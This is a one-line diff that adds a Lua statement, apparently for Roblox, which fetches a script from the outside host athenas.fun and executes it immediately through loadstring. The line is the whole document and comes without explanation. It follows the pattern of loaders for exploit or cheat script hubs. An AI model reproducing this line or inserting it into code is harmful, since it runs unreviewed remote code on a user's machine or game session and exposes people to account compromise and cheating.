@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("http://athenas.fun/athena.lua", true))()
